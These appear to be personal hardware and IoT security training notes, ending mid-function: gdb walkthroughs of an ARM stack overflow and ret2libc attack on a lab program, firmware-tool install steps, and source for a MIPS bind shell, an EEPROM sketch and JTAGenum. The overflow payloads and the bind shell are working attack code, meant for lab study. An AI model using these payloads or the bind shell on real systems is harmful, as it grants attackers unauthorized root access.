recompile buffer_overflow.c file:
	gcc buffer_overflow.c -g -o buff_overflow
		-g -> turn on debug symbols
		-o -> output to file

gdb buff_overflow
	disassemble main  	(disassemble <functions>)
	disassemble vulnerable
	info functions			#Show functions

Set a break point on the function vulnerable:
	b vulnerable

Run the program and insert garbage data:
	r "AAAABBBB"

Examine the stack from out breakpoint
	x/10x $sp	#x -> examine
			#10 -> places
			#x -> x after 10 means in HEX
			#$sp -> starting from the stack pointer 

Look at registers:
	info registers
	
Should see 0x000084a8 as the LR (link register) as of now. Link Registers (LR) and Program Counters (PC) are what you want to overwrite with Buffer Overflows 

Step through the program using "s":
	s

Look at the stack again:
	x/10x $sp
	
You should see the "AAAA" and "BBBB" represented as 0x41414141 and 0x42424242

Now rung the program again but with more garbage data:
	r "AAAABBBBCCCCDDDDEEEE"

Look at the stack again:
	x/10x $sp

Step through with "s":
	s

Look at the stack again:
	x/10x $sp

You should see the "A B C D E" represented as 0x41414141, 0x42424242, 0x43434343, 0x44444444, 0x45454545
Continue executing the program using "c":
	c

The program should seg fault since 0x45454545 has overwritten the LR (Link Register) 0x000084a8

Now we want to try and overwrite it with the address of "I should never be called" in the program

disassemble the function "IShouldNeverBeCalled"
	disassemble IShouldNeverBeCalled 	#Get the first address listed
		or
	print IShouldNeverBeCalled

The address should be "0x00008438" This is the starting address for the IShouldNeverBeCalled function.

Run the program again and insert the garbage data again. However, this time add the starting address
for the auction IShouldNeverBeCalled. Put the address in Little Indian Format:
	r `printf "AAAABBBBCCCCDDDD\x38\x84"`

Analyze the stack, step through the program and analyze again
	x/10x $sp
	s
	x/10x $sp

The address should now be 0x00008438 which is the address for the IShouldNeverBeCalled function

Now continue the program using the "c" key.
	c

You should now see the "I should never be called" string printed.



EXAMPLE 2 (Ret2Libc/Erand48() /bin/sh):
--------------------

What we are trying to do is:
	Place address of /bin/sh in R0 then jump to system()
	Effectively we will do:
		system(/bin/sh)		#or rather the address of /bin/sh
	address of /bin/sh = R0  #Register 0
	system() = LR #(Link Register)


Run gdb with the buff_overflow program:
	gdb ./buff_overflow
	
Run the program within gdb, set the breakpoint and disassemble erand48:
	b vulnerable
	r "AAAA"
	disassemble erand48
	
Note the locations of R0 and LR

look at system and note the address:
	print system

Craft Exploit using the address of R0 from disassemble erand48 command using little indian:
	r `printf "AAAABBBBCCCCDDDD\x48\x71\x05\x40BINSAAAABBBB\x34\xed\x05\x40/bin/sh"`
		x48\x71\x05\x40		-> R0
		BINSAAAABBBB		-> her first 4 bytes
		\x34\xed\x05\x40	-> address of system from the "print system" command"

Step through and analyze the stack with string:
	s
	x/20s $sp		#s is string instead of hex

Note the address that comes after the line containing /bin/sh
Subtract 8 bytes from it and extract that from the address.
In this case it would be 0xbefffbf0 - 8 bytes which is 0xbefffbe8
Extract the new address:
	x/s 0xbefffbe8

Now replace the BINS with the new address:
	r `printf "AAAABBBBCCCCDDDD\x48\x71\x05\x40\xe8\xfb\xff\xbeAAAABBBB\x34\xed\x05\x40/bin/sh"`
	s
	x/10x $sp
	s
	s

At this point you should have a root shell
	id
	ls


ROP Gadget finder:
	https://github.com/JonathanSalwan/ROPGadget

GDP Enhanced features:
	https://githubcom/hugsy/gef

GDB-peda (Python Exploit Development Assistance for GDB):
	https://github.com/longld/peda

Radare2 for Binary Analysis:
	https://github.com/radare/radare2




***********************************************************************************
Manually Install Binwalk, FMK, FAT, Firmadyne
***********************************************************************************

Manually Install:
FMK - Firmware Mod Kit
FAT - Firmware Analysis Toolkit
	https://github.com/attify/firmware-analysis-toolkit

Install QEMU (see installing for ARM below)
	apt-get install qemu qemu-user-static 


Install Binwalk:
	apt-get remove binwalk
	git clone https://github.com/devttys0/binwalk.git
	cd binwalk
	wget http://ftp.us.debian.org/debian/pool/main/c/cramfs/cramfsprogs_1.1-6_amd64.deb
	dpkg -i cramfsprogs_1.1-6_amd64.deb
	wget http://ftp.us.debian.org/debian/pool/main/c/cramfsswap/cramfsswap_1.4.1-1_amd64.deb
	dpkg -i cramfsswap_1.4.1-1_amd64.deb
	./deps.sh
	python ./setup.py install
	apt-get install python-lzma
	# sudo -H pip install git+https://github.com/ahupp/python-magic 
		# ???  apt-get install python-magic
	

Install firmadyne:
	Firmadyne ->	https://github.com/firmadyne/firmadyne
	sudo apt-get install busybox-static fakeroot git kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan postgresql
	git clone --recursive https://github.com/firmadyne/firmadyne.git
	update-rc.d postgresql enable
	update-rc.d -f postgresql enable 2 3 4 5 
	sudo -u postgres createuser -P firmadyne #with password firmadyne
	sudo -u postgres createdb -O firmadyne firmware
	sudo -u postgres psql -d firmware < ./firmadyne/database/schema
	cd ./firmadyne; 
	./download.sh
	Edit firmadyne.config and make the FIRMWARE_DIR point to the current location
		of Firmadyne folder.

Install FAT:
	git clone https://github.com/attify/firmware-analysis-toolkit
	edit lines 9-11 in fat.py to the correct paths
	cp fat.py ../firmadyne/
	cp reset.sh ../firmadyne/
	chmod +x ../firmadyne/fat.py
	chmod +x ../firmadyne/reset.sh

Install FMK:
	apt-get install git build-essential zlib1g-dev liblzma-dev python-magic
	git clone https://github.com/brianpow/firmware-mod-kit.git
	edit the shared-ng.inc change binwalk to correct path
	
Install Firmwalker:
	git clone https://github.com/craigz28/firmwalker.git


Install QEMU with ARM support:
	Can also be ran on a Raspberry Pi, since it is ARM
	apt-get build-dep qemu
	wget http://wiki.qemu.org/download/qemu-1.2.0.tar.bz2
		./configure --target0list=arm-softmmu
		make
		make install
	Video for setting up ARM environment in Qemu:
		https://www.securitytube.net/video/5818

	Download all hard disk images, kernel images:
		http://people.debian.org/~aurel32/qemu/armel/

		root:root
		apt-get update
		apt-get install gcc gdb
		tassel install gnome-desktop --new-install (to install guy)

	Execute the ARM environment:
		qemu-system-arm -M versatilepb -kernel vmlinuz-2.6.32-5-versatile -initrd initrd.img-2.6.32-5-versatile -hda debian_squeeze_armel_standard.qcow2 -append "root=/dev/sda1" -m 256 -redir tcp:2222::22

		or
		sh ./Lanuchvm.sh
			
		then ssh into the ARM vm on port 2222
			ssh root@localhost -p 2222	#password is 'exploit'

		cat /proc/cpuinfo
			you will see it is an ARM processor

		you can press CTRL-ALT if QEMU grabs control of mouse and keyboard

		

***********************************************************************************
Bindshell Source Code (BindShell.c)
***********************************************************************************


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SERVER_PORT	9999
/ * CC-BY: Osanda Malith Jayathissa (@OsandaMalith)
  * Bind Shell using Fork for my TP-Link mr3020 router running busybox
  * Arch : MIPS
  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc
  * /
int main() {
	int serverfd, clientfd, server_pid, i = 0;
	char *banner = "[~] Welcome to @OsandaMalith's Bind Shell\n";
	char *args[] = { "/bin/busybox", "sh", (char *) 0 };
	struct sockaddr_in server, client;
	socklen_t len;
	
	server.sin_family = AF_INET;
	server.sin_port = htons(SERVER_PORT);
	server.sin_addr.s_addr = INADDR_ANY; 

	serverfd = socket(AF_INET, SOCK_STREAM, 0);
	bind(serverfd, (struct sockaddr *)&server, sizeof(server));
	listen(serverfd, 1);

    while (1) { 
    	len = sizeof(struct sockaddr);
    	clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
        server_pid = fork(); 
        if (server_pid) { 
        	write(clientfd , banner , strlen(banner));
	        for(; i <3 /*u*/; i++) dup2(clientfd, i);
	        execve("/bin/busybox", args, (char *) 0);
	        close(clientfd); 
    	} close(clientfd);
    } return 0;
}



***********************************************************************************
write_eeprom source code
***********************************************************************************
/* 
  *  Use the I2C bus with EEPROM 24LC64 
  *  Sketch:    eeprom.pde
  *  
  *  Author: hkhijhe
  *  Date: 01/10/2010
  * 
  *   
  */

  #include <Wire.h> //I2C library



  void i2c_eeprom_write_byte( int deviceaddress, unsigned int eeaddress, byte data ) {
    int rdata = data;
    Wire.beginTransmission(deviceaddress);
    Wire.write((int)(eeaddress >> 8)); // MSB
    Wire.write((int)(eeaddress & 0xFF)); // LSB
    Wire.write(rdata);
    Wire.endTransmission();
  }

  // WARNING: address is a page address, 6-bit end will wrap around
  // also, data can be maximum of about 30 bytes, because the Wire library has a buffer of 32 bytes
  void i2c_eeprom_write_page( int deviceaddress, unsigned int eeaddresspage, byte* data, byte length ) {
    Wire.beginTransmission(deviceaddress);
    Wire.write((int)(eeaddresspage >> 8)); // MSB
    Wire.write((int)(eeaddresspage & 0xFF)); // LSB
    byte c;
    for ( c = 0; c < length; c++)
      Wire.write(data[c]);
    Wire.endTransmission();
  }

  byte i2c_eeprom_read_byte( int deviceaddress, unsigned int eeaddress ) {
    byte rdata = 0xFF;
    Wire.beginTransmission(deviceaddress);
    Wire.write((int)(eeaddress >> 8)); // MSB
    Wire.write((int)(eeaddress & 0xFF)); // LSB
    Wire.endTransmission();
    Wire.requestFrom(deviceaddress,1);
    if (Wire.available()) rdata = Wire.read();
    return rdata;
  }

  // maybe let's not read more than 30 or 32 bytes at a time!
  void i2c_eeprom_read_buffer( int deviceaddress, unsigned int eeaddress, byte *buffer, int length ) {
    Wire.beginTransmission(deviceaddress);
    Wire.write((int)(eeaddress >> 8)); // MSB
    Wire.write((int)(eeaddress & 0xFF)); // LSB
    Wire.endTransmission();
    Wire.requestFrom(deviceaddress,length);
    int c = 0;
    for ( c = 0; c < length; c++ )
      if (Wire.available()) buffer[c] = Wire.read();
  }




  void setup() 
  {
    char somedata[] = "Fluffy Fuffkins was here!"; // data to write
    Wire.begin(); // initialise the connection
    Serial.begin(9600);
    i2c_eeprom_write_page(0x50, 0, (byte *)somedata, sizeof(somedata)); // write to EEPROM 

    delay(10); //add a small delay

    Serial.println("Memory written");
  }

  void loop() 
  {
    int addr=0; //first address
    byte b = i2c_eeprom_read_byte(0x50, 0); // access the first address from the memory

    while (b!=0) 
    {
      Serial.print((char)b); //print content to serial port
      addr++; //increase address
      b = i2c_eeprom_read_byte(0x50, addr); //access an address from the memory
    }
    Serial.println(" ");
    delay(2000);

  }







***********************************************************************************
jtagenum source code
***********************************************************************************

/*
 JTAGenum
 Given a Arduino compatible microcontroller JTAGenum scans
 pins[] for basic JTAG functionality. After programming 
 your microcontroller open a serial terminal with 115200 
 baud and send 'h' to see usage information. 
 
 SETUP:
 Define the pins[] and pinnames[] map of pin names to pins 
 you want to scan with. If you are using a 3.3v board 
 uncomment the CPU_PRESCALE defintions at the top and in 
 the setup() function.
 
 If you plan to use IDCODE, Boundary or IR scan routines
 define the IR_IDCODE, IR_SAMPLE+SCAN_LEN and 
 IR_LEN+CHAIN_LEN values according to suspected or 
 documented values.
 
 Further documentation:
 http://deadhacker.com/2010/02/03/jtag-enumeration/ 
 
 
 AUTHORS & CODE BRANCHES:
 cyphunk  http://github.com/cyphunk/JTAGenum/
 jal2	  http://github.com/jal2/JTAGenum/
 zoobab	  http://new.hackerspace.be/JTAG_pinout_detector
 z1Y2x    https://github.com/z1Y2x/JTAGenum/
 
 Most modifications are merged back into the first URL.
 Check the others for cutting edge or solutions if you 
 run into problems.	 JTAGenum is based on Lekernel's 
 ArduiNull[1] which was itself inspired by Hunz's 
 JTAG Finder[2]. Tested on Arduino Mini Pro, Arduino 
 Mega, Arduino Duemilanove and Teensy++[3].
 [1]http://lekernel.net/blog/?p=319
 [2]http://www.c3a.de/wiki/index.php/JTAG_Finder
 [4]http://www.pjrc.com/teensy/	 
 This code is public domain, use as you wish and at your own risk
*/

//needed to put help strings into flash
#include <avr/pgmspace.h>

/*
 * BEGIN USER DEFINITIONS
 */

//#define DEBUGTAP
//#define DEBUGIR

// For 3.3v AVR boards. Cuts clock in half. Also see cmd in setup()
#define CPU_PRESCALE(n) (CLKPR = 0x80, CLKPR = (n))

// Setup the pins to be checked
/*
 * Teensy v3.1: usable digital pins are: A0-A7
 *	 (13 is connected to the LED)
 */
//byte       pins[] = {  A0 ,  A1 ,  A2 ,  A3 ,  A4 ,  A5 ,  A6 ,  A7  };
//char * pinnames[] = { "A0", "A1", "A2", "A3", "A4", "A5", "A6", "A7" };
/*
 * Teensy v2
 */
//byte       pins[] = { PIN_B0, PIN_B1, PIN_B2, PIN_B4, PIN_B5 };
//char * pinnames[] = { "TRST", " TDI", " TMS", " TCK", " TDO" };
/*
 * Arduino Pro: usable digital pins are: 2-12, 14-19 (ANALOG 0-5)
 *	 (0,1 are the serial line, 13 is connected to the LED)
 */
byte       pins[] = { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 };
char * pinnames[] = { "DIG_2", "DIG_3", "DIG_4", "DIG_5", "DIG_6",
                      "DIG_7", "DIG_8", "DIG_9", "DIG_10", "DIG_11" };

// Once you have found the JTAG pins you can define
// the following to allow for the boundary scan and
// irenum functions to be run. Define the values
// as the index for the pins[] array of the found
// jtag pin:
#define	TCK                      0
#define	TMS                      1
#define	TDO                      2
#define	TDI                      3
#define	TRST                     4

// Pattern used for scan() and loopback() tests
#define PATTERN_LEN              64
// Use something random when trying find JTAG lines:
static char pattern[PATTERN_LEN] = "0110011101001101101000010111001001";
// Use something more determinate when trying to find
// length of the DR register:
//static char pattern[PATTERN_LEN] = "1000000000000000000000000000000000";

// Max. number of JTAG enabled chips (MAX_DEV_NR) and length
// of the DR register together define the number of
// iterations to run for scan_idcode():
#define MAX_DEV_NR               8
#define IDCODE_LEN               32  

// Target specific, check your documentation or guess 
#define SCAN_LEN                 1890 // used for IR enum. bigger the better
#define IR_LEN                   5
// IR registers must be IR_LEN wide:
#define IR_IDCODE                "01100" // always 011
#define IR_SAMPLE                "10100" // always 101
#define IR_PRELOAD               IR_SAMPLE

/*
 * END USER DEFINITIONS
 */



// TAP TMS states we care to use. NOTE: MSB sent first
// Meaning ALL TAP and IR codes have their leftmost
// bit sent first. This might be the reverse of what
// documentation for your target(s) show.
#define TAP_RESET                "11111"       // looping 1 will return 
                                               // IDCODE if reg available
#define TAP_SHIFTDR              "111110100"
#define TAP_SHIFTIR              "1111101100" // -11111> Reset -0> Idle -1> SelectDR
                                              // -1> SelectIR -0> CaptureIR -0> ShiftIR

// Ignore TCK, TMS use in loopback check:
#define IGNOREPIN                0xFFFF 
// Flags configured by UI:
boolean VERBOSE                  = 0; // 255 = true
boolean DELAY                    = 0;
long    DELAYUS                  = 5000; // 5 Milliseconds
boolean PULLUP                   = 255; 


const byte pinslen               = sizeof(pins)/sizeof(pins[0]);	 


void setup(void)
{
        // Uncomment for 3.3v boards. Cuts clock in half
        // only on avr based arduino & teensy hardware
        //CPU_PRESCALE(0x01); 
        Serial.begin(115200);
}



/*
 * Set the JTAG TAP state machine
 */
void tap_state(char tap_state[], int tck, int tms) 
{
#ifdef DEBUGTAP
	Serial.print("tap_state: tms set to: ");
#endif
	while (*tap_state) { // exit when string \0 terminator encountered
		if (DELAY) delayMicroseconds(50);
		digitalWrite(tck, LOW);				   
		digitalWrite(tms, *tap_state - '0'); // conv from ascii pattern
#ifdef DEBUGTAP
		Serial.print(*tap_state - '0',DEC);
#endif
		digitalWrite(tck, HIGH); // rising edge shifts in TMS
		*tap_state++;
	}				 
#ifdef DEBUGTAP
	Serial.println();
#endif
}

static void pulse_tms(int tck, int tms, int s_tms)
{
	if (tck == IGNOREPIN) return;
	digitalWrite(tck, LOW);
	digitalWrite(tms, s_tms); 
	digitalWrite(tck, HIGH);
}
static void pulse_tdi(int tck, int tdi, int s_tdi)
{
	if (DELAY) delayMicroseconds(50);
	if (tck != IGNOREPIN) digitalWrite(tck, LOW);
	digitalWrite(tdi, s_tdi); 
	if (tck != IGNOREPIN) digitalWrite(tck, HIGH);
}
byte pulse_tdo(int tck, int tdo)
{
	byte tdo_read;
	if (DELAY) delayMicroseconds(50);
	digitalWrite(tck, LOW); // read in TDO on falling edge
	tdo_read = digitalRead(tdo);
	digitalWrite(tck, HIGH);
	return tdo_read;
}

/*
 * Initialize all pins to a default state
 * default with no arguments: all pins as INPUTs
 */
void init_pins(int tck = IGNOREPIN, int tms = IGNOREPIN, int tdi = IGNOREPIN, int ntrst = IGNOREPIN) 
{ 
	// default all to INPUT state
	for (int i = 0; i < pinslen; i++) {
		pinMode(pins[i], INPUT);
		// internal pullups default to logic 1:
		if (PULLUP) digitalWrite(pins[i], HIGH); 
	}
	// TCK = output
	if (tck != IGNOREPIN) pinMode(tck, OUTPUT);
	// TMS = output
	if (tms != IGNOREPIN) pinMode(tms, OUTPUT);
	// tdi = output
	if (tdi != IGNOREPIN) pinMode(tdi, OUTPUT);
	// ntrst = output, fixed to 1
	if (ntrst != IGNOREPIN) {
		pinMode(ntrst, OUTPUT);
		digitalWrite(ntrst, HIGH);
	}
}


/*
 * send pattern[] to TDI and check for output on TDO
 * This is used for both loopback, and Shift-IR testing, i.e.
 * the pattern may show up with some delay.
 * return: 0 = no match
 *		   1 = match 
 *		   2 or greater = no pattern found but line appears active
 *
 * if retval == 1, *reglen returns the length of the register
 */
static int check_data(char pattern[], int iterations, int tck, int tdi, int tdo,
                      int *reg_len)
{
	int i;
        int w          = 0;
	int plen       = strlen(pattern);
	char tdo_read;
	char tdo_prev;
	int nr_toggle  = 0; // count how often tdo toggled
	/* we store the last plen (<=PATTERN_LEN) bits,
	 *  rcv[0] contains the oldest bit */
	char rcv[PATTERN_LEN];
	
	tdo_prev = '0' + (digitalRead(tdo) == HIGH);

	for(i = 0; i < iterations; i++) {
		
		/* output pattern and incr write index */
		pulse_tdi(tck, tdi, pattern[w++] - '0');
		if (!pattern[w])
			w = 0;

		/* read from TDO and put it into rcv[] */
		tdo_read  =  '0' + (digitalRead(tdo) == HIGH);

		nr_toggle += (tdo_read != tdo_prev);
		tdo_prev  =  tdo_read;

		if (i < plen)
			rcv[i] = tdo_read;
		else 
		{
			memmove(rcv, rcv + 1, plen - 1);
			rcv[plen-1] = tdo_read;
		}
				
		/* check if we got the pattern in rcv[] */
		if (i >= (plen - 1) ) {
			if (!memcmp(pattern, rcv, plen)) {
				*reg_len = i + 1 - plen;
				return 1;
			}
		}
	} /* for(i=0; ... ) */
  
	*reg_len = 0;
	return nr_toggle > 1 ? nr_toggle : 0;
}

static void print_pins(int tck, int tms, int tdo, int tdi, int ntrst)
{
	if (ntrst != IGNOREPIN) {
		Serial.print(" ntrst:");
		Serial.print(pinnames[ntrst]);
	}
	Serial.print(" tck:");
	Serial.print(pinnames[tck]);
	Serial.print(" tms:");
	Serial.print(pinnames[tms]);
	Serial.print(" tdo:");
	Serial.print(pinnames[tdo]);
	if (tdi != IGNOREPIN) {
		Serial.print(" tdi:");
		Serial.print(pinnames[tdi]);
	}
}

/*
 * Shift JTAG TAP to ShiftIR state. Send pattern to TDI and check
 * for output on TDO
 */
static void scan()
{
	int tck, tms, tdo, tdi, ntrst;
	int checkdataret = 0;
	int len;
	int reg_len;
	printProgStr(PSTR("================================\r\n"
	                  "Starting scan for pattern:"));
	Serial.println(pattern);
	for(ntrst=0;ntrst<pinslen;ntrst++) {
		for(tck=0;tck<pinslen;tck++) {
			if(tck == ntrst) continue;
			for(tms=0;tms<pinslen;tms++) {
				if(tms == ntrst) continue;
				if(tms == tck  ) continue;
				for(tdo=0;tdo<pinslen;tdo++) {
					if(tdo == ntrst) continue;
					if(tdo == tck  ) continue;
					if(tdo == tms  ) continue;
					for(tdi=0;tdi<pinslen;tdi++) {
						if(tdi == ntrst) continue;
						if(tdi == tck  ) continue;
						if(tdi == tms  ) continue;
						if(tdi == tdo  ) continue;
						if(VERBOSE) {
							print_pins(tck, tms, tdo, tdi, ntrst);
							Serial.print("	  ");
						}
						init_pins(pins[tck], pins[tms], pins[tdi], pins[ntrst]);
						tap_state(TAP_SHIFTIR, pins[tck], pins[tms]);
						checkdataret = check_data(pattern, (2*PATTERN_LEN), 
						                pins[tck], pins[tdi], pins[tdo], &reg_len); 
						if(checkdataret == 1) {
							Serial.print("FOUND! ");
							print_pins(tck, tms, tdo, tdi, ntrst);
							Serial.print(" IR length: ");
							Serial.println(reg_len, DEC);
						}
						else if(checkdataret > 1) {
							Serial.print("active ");
							print_pins(tck, tms, tdo, tdi, ntrst);
							Serial.print("	bits toggled:");
							Serial.println(checkdataret);
						}
						else if(VERBOSE) Serial.println();										  
					} /* for(tdi=0; ... ) */
				} /* for(tdo=0; ... ) */
			} /* for(tms=0; ... ) */
		} /* for(tck=0; ... ) */
	} /* for(ntrst=0; ... ) */
	printProgStr(PSTR("================================\r\n"));
}
/*
 * Check for pins that pass pattern[] between tdi and tdo
 * regardless of JTAG TAP state (tms, tck ignored).
 *
 * TDO, TDI pairs that match indicate possible shorts between
 * pins. Pins that do not match but are active might indicate
 * that the patch cable used is not shielded well enough. Run
 * the test again without the cable connected between controller
 * and target. Run with the verbose flag to examine closely.
 */
static void loopback_check()
{
	int tdo, tdi;
	int checkdataret = 0;
	int reg_len;

	printProgStr(PSTR("================================\r\n"
	                  "Starting loopback check...\r\n"));
	for(tdo=0;tdo<pinslen;tdo++) {
		for(tdi=0;tdi<pinslen;tdi++) {
			if(tdi == tdo) continue;
	
			if(VERBOSE) {
				Serial.print(" tdo:");
				Serial.print(pinnames[tdo]);
				Serial.print(" tdi:");
				Serial.print(pinnames[tdi]);
				Serial.print("	  ");
			}
			init_pins(IGNOREPIN/*tck*/, IGNOREPIN/*tck*/, pins[tdi], IGNOREPIN /*ntrst*/);
			checkdataret = check_data(pattern, (2*PATTERN_LEN), IGNOREPIN, pins[tdi], pins[tdo], &reg_len);
			if(checkdataret == 1) {
				Serial.print("FOUND! ");
				Serial.print(" tdo:");
				Serial.print(pinnames[tdo]);
				Serial.print(" tdi:");
				Serial.print(pinnames[tdi]);
				Serial.print(" reglen:");
				Serial.println(reg_len);
			}
			else if(checkdataret > 1) {
				Serial.print("active ");
				Serial.print(" tdo:");
				Serial.print(pinnames[tdo]);
				Serial.print(" tdi:");
				Serial.print(pinnames[tdi]);
				Serial.print("	bits toggled:");
				Serial.println(checkdataret);
			}
			else if(VERBOSE) Serial.println();
		}
	}
	printProgStr(PSTR("================================\r\n"));
}

/*
 * Scan TDO for IDCODE. Handle MAX_DEV_NR many devices.
 * We feed zeros into TDI and wait for the first 32 of them to come out at TDO (after n * 32 bit).
 * As IEEE 1149.1 requires bit 0 of an IDCODE to be a "1", we check this bit.
 * We record the first bit from the idcodes into bit0.
 * (oppposite to the old code).
 * If we get an IDCODE of all ones, we assume that the pins are wrong.
 */
static void scan_idcode()
{
	int tck, tms, tdo, tdi, ntrst;
	int i, j;
	int nr; /* number of devices */
	int tdo_read;
	uint32_t idcodes[MAX_DEV_NR];
	printProgStr(PSTR("================================\r\n"
	                  "Starting scan for IDCODE...\r\n"));
	char idcodestr[] = "								";
	int idcode_i = 31; // TODO: artifact that might need to be configurable
	uint32_t idcode;
	for(ntrst=0;ntrst<pinslen;ntrst++) {
		for(tck=0;tck<pinslen;tck++) {
			if(tck == ntrst) continue;
			for(tms=0;tms<pinslen;tms++) {
				if(tms == ntrst) continue;
				if(tms == tck  ) continue;
				for(tdo=0;tdo<pinslen;tdo++) {
					if(tdo == ntrst) continue;
					if(tdo == tck  ) continue;
					if(tdo == tms  ) continue;
					for(tdi=0;tdi<pinslen;tdi++) {
						if(tdi == ntrst) continue;
						if(tdi == tck  ) continue;
						if(tdi == tms  ) continue;
						if(tdi == tdo  ) continue;
						if(VERBOSE) {
							print_pins(tck, tms, tdo, tdi, ntrst);
							Serial.print("	  ");
						}
						init_pins(pins[tck], pins[tms], pins[tdi], pins[ntrst]);

						/* we hope that IDCODE is the default DR after reset */
						tap_state(TAP_RESET, pins[tck], pins[tms]);
						tap_state(TAP_SHIFTDR, pins[tck], pins[tms]);
						
						/* j is the number of bits we pulse into TDI and read from TDO */
						for(i = 0; i < MAX_DEV_NR; i++) {
							idcodes[i] = 0;
							for(j = 0; j < IDCODE_LEN;j++) {
								/* we send '0' in */
								pulse_tdi(pins[tck], pins[tdi], 0);
								tdo_read = digitalRead(pins[tdo]);
								if (tdo_read)
									idcodes[i] |= ( (uint32_t) 1 ) << j;
	
								if (VERBOSE)
									Serial.print(tdo_read,DEC);
							} /* for(j=0; ... ) */
							if (VERBOSE) {
								Serial.print(" ");
								Serial.println(idcodes[i],HEX);
							}
							/* save time: break at the first idcode with bit0 != 1 */
							if (!(idcodes[i] & 1) || idcodes[i] == 0xffffffff)
								break;
						} /* for(i=0; ...) */
	
						if (i > 0) {
							print_pins(tck,tms,tdo,tdi,ntrst);
							Serial.print("	devices: ");
							Serial.println(i,DEC);
							for(j = 0; j < i; j++) {
								Serial.print("	0x");
								Serial.println(idcodes[j],HEX);
							}
						} /* if (i > 0) */
					} /* for(tdo=0; ... ) */
				} /* for(tdi=0; ...) */
			} /* for(tms=0; ...) */
		} /* for(tck=0; ...) */
	} /* for(trst=0; ...) */

	printProgStr(PSTR("================================\r\n"));
}

static void shift_bypass()
{
	int tdi, tdo, tck;
	int checkdataret;
	int reg_len;

	printProgStr(PSTR("================================\r\n"
	                  "Starting shift of pattern through bypass...\r\n"
	                  "Assumes bypass is the default DR on reset.\r\n"
	                  "Hence, no need to check for TMS. Also, currently\r\n"
	                  "not checking for nTRST, which might not work\r\n"));
	for(tck=0;tck<pinslen;tck++) {
		for(tdi=0;tdi<pinslen;tdi++) {
			if(tdi == tck) continue;
			for(tdo=0;tdo<pinslen;tdo++) {
				if(tdo == tck) continue;
				if(tdo == tdi) continue;
				if(VERBOSE) {
					Serial.print(" tck:");
					Serial.print(pinnames[tck]);
					Serial.print(" tdi:");
					Serial.print(pinnames[tdi]);
					Serial.print(" tdo:");
					Serial.print(pinnames[tdo]);
					Serial.print("	  ");
				}

				init_pins(pins[tck], IGNOREPIN/*tms*/,pins[tdi], IGNOREPIN /*ntrst*/);
				// if bypass is default on start, no need to init TAP state
				checkdataret = check_data(pattern, (2*PATTERN_LEN), pins[tck], pins[tdi], pins[tdo], &reg_len);
				if(checkdataret == 1) {
					Serial.print("FOUND! ");
					Serial.print(" tck:");
					Serial.print(pinnames[tck]);
					Serial.print(" tdo:");
					Serial.print(pinnames[tdo]);
					Serial.print(" tdi:");
					Serial.println(pinnames[tdi]);
				}
				else if(checkdataret > 1) {
					Serial.print("active ");
					Serial.print(" tck:");
					Serial.print(pinnames[tck]);
					Serial.print(" tdo:");
					Serial.print(pinnames[tdo]);
					Serial.print(" tdi:");
					Serial.print(pinnames[tdi]);
					Serial.print("	bits toggled:");
					Serial.println(checkdataret);
				}
				else if(VERBOSE) Serial.println();
			}
		}
	}
	printProgStr(PSTR("================================\r\n"));
}
/* ir_state()
 * Set TAP to Reset then ShiftIR. 
 * Shift in state[] as IR value.
 * Switch to ShiftDR state and end.
 */
void ir_state(char state[], int tck, int tms, int tdi) 
{
#ifdef DEBUGIR
	Serial.println("ir_state: set TAP to ShiftIR:");
#endif
	tap_state(TAP_SHIFTIR, tck, tms);
#ifdef DEBUGIR
	Serial.print("ir_state: pulse_tdi to: ");
#endif
	for (int i=0; i < IR_LEN; i++) {
		if (DELAY) delayMicroseconds(50);
		// TAP/TMS changes to Exit IR state (1) must be executed
		// at same time that the last TDI bit is sent:
		if (i == IR_LEN-1) {
			digitalWrite(tms, HIGH); // ExitIR
#ifdef DEBUGIR
			Serial.print(" (will be in ExitIR after next bit) ");
#endif
		}
		pulse_tdi(tck, tdi, *state-'0');
#ifdef DEBUGIR
		Serial.print(*state-'0', DEC);
#endif
		// TMS already set to 0 "shiftir" state to shift in bit to IR
		*state++;
	}
#ifdef DEBUGIR
	Serial.println("\r\nir_state: Change TAP from ExitIR to ShiftDR:");
#endif
	// a reset would cause IDCODE instruction to be selected again
	tap_state("1100", tck, tms); // -1> UpdateIR -1> SelectDR -0> CaptureDR -0> ShiftDR
}
static void sample(int iterations, int tck, int tms, int tdi, int tdo, int ntrst=IGNOREPIN)
{
	printProgStr(PSTR("================================\r\n"
	                  "Starting sample (boundary scan)...\r\n")); 
	init_pins(tck, tms ,tdi, ntrst);  

	// send instruction and go to ShiftDR
	ir_state(IR_SAMPLE, tck, tms, tdi);

	// Tell TAP to go to shiftout of selected data register (DR)
	// is determined by the instruction we sent, in our case 
	// SAMPLE/boundary scan
	for (int i = 0; i < iterations; i++) {
		// no need to set TMS. It's set to the '0' state to 
		// force a Shift DR by the TAP
		Serial.print(pulse_tdo(tck, tdo),DEC);
		if (i % 32  == 31 ) Serial.print(" ");
		if (i % 128 == 127) Serial.println();
	}
}

char ir_buf[IR_LEN+1];
static void brute_ir(int iterations, int tck, int tms, int tdi, int tdo, int ntrst=IGNOREPIN)
{
	printProgStr(PSTR("================================\r\n"
	                  "Starting brute force scan of IR instructions...\r\n"
	                  "NOTE: If Verbose mode is off output is only printed\r\n"
	                  "      after activity (bit changes) are noticed and\r\n"
	                  "      you might not see the first bit of output.\r\n"
	                  "IR_LEN set to ")); 
	Serial.println(IR_LEN,DEC);

	init_pins(tck, tms ,tdi, ntrst);  
	int iractive;
	byte tdo_read;
	byte prevread;
	for (uint32_t ir = 0; ir < (1UL << IR_LEN); ir++) { 
		iractive=0;
		// send instruction and go to ShiftDR (ir_state() does this already)
		// convert ir to string.
		for (int i = 0; i < IR_LEN; i++) 
			ir_buf[i]=bitRead(ir, i)+'0';
		ir_buf[IR_LEN]=0;// terminate
		ir_state(ir_buf, tck, tms, tdi);
		// we are now in TAP_SHIFTDR state

		prevread = pulse_tdo(tck, tdo);
		for (int i = 0; i < iterations-1; i++) {
			// no need to set TMS. It's set to the '0' state to force a Shift DR by the TAP
			tdo_read = pulse_tdo(tck, tdo);
			if (tdo_read != prevread) iractive++;
			
			if (iractive || VERBOSE) {
				Serial.print(prevread,DEC);
				if (i%16 == 15) Serial.print(" ");
				if (i%128 == 127) Serial.println();
			}
			prevread = tdo_read;
		}
